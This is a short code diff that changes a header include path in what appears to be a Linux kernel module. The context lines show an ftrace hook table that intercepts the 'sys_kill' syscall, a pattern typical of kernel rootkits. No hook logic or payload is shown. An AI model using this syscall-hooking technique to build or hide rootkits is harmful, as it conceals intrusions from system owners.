@@ -1,4 +1,4 @@
-#include "poet.h"
+#include "inc/poet.h"
 
 static struct ftrace_hook hooks[] = {
 	HOOK("sys_kill", hook_kill, &orig_kill),
